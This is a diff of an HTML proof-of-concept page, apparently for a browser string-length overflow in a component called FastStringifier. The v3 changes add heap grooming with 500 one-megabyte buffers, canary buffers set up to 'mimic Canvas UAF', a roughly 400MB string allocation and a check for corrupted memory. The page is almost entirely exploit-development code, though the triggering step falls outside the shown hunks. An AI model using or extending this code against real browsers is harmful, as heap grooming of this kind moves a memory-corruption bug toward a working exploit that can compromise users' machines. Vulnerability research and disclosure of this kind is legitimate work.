@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>FastStringifier Overflow PoC v2</title>
+    <title>FastStringifier Overflow PoC v3</title>
     <style>
         #trigger {
             margin: 20px;
@@ -20,24 +20,24 @@
     </style>
 </head>
 <body>
-    <h1>FastStringifier Overflow PoC v2</h1>
-    <p>Click to trigger string length overflow with alerts.</p>
+    <h1>FastStringifier Overflow PoC v3</h1>
+    <p>Click to trigger string length overflow with memory checks.</p>
     <button id="trigger">Trigger Overflow</button>
     <script>
-        function checkMemory() {
+        function setupMemoryCheck() {
             const buffers = [];
-            // Allocate multiple buffers for better coverage
-            for (let i = 0; i < 10; i++) {
-                const buf = new ArrayBuffer(16384); // 16 KB each
+            // Allocate buffers with 0x46 (mimic Canvas UAF)
+            for (let i = 0; i < 20; i++) {
+                const buf = new ArrayBuffer(8192); // 8KB each
                 const view = new Uint8Array(buf);
-                view.fill(0xFF);
+                view.fill(0x46); // Fill with 0x46
                 buffers.push(view);
             }
             return () => {
                 let changes = [];
                 for (let b = 0; b < buffers.length; b++) {
                     for (let i = 0; i < buffers[b].length; i++) {
-                        if (buffers[b][i] !== 0xFF) {
+                        if (buffers[b][i] !== 0x46) {
                             changes.push(`Buffer[${b}][0x${i.toString(16)}]: 0x${buffers[b][i].toString(16)}`);
                         }
                     }
@@ -49,12 +49,22 @@
         document.getElementById('trigger').addEventListener('click', () => {
             alert('Initiating PoC...');
             try {
+                // Heap grooming
+                alert('Grooming heap...');
+                const groom = [];
+                for (let i = 0; i < 500; i++) {
+                    const buf = new ArrayBuffer(1024 * 1024); // 1MB
+                    const view = new Uint8Array(buf);
+                    view.fill(0x41);
+                    groom.push(view);
+                }
+
                 // Initialize memory checker
-                const check = checkMemory();
-                alert('Memory checker initialized (10x16KB buffers).');
+                const check = setupMemoryCheck();
+                alert('Memory checker initialized (20x8KB buffers with 0x46).');
 
                 // Allocate large string
-                const stringSize = 550000000; // ~550MB
+                const stringSize = 400000000; // ~400MB
                 alert(`Attempting to allocate string of size ${stringSize} bytes...`);
                 setTimeout(() => {
                     try {
@@ -75,7 +85,7 @@
                     } catch (err) {
                         alert(`Error: ${err.message}`);
                     }
-                }, 200);
+                }, 300);
             } catch (err) {
                 alert(`Initial error: ${err.message}`);
             }
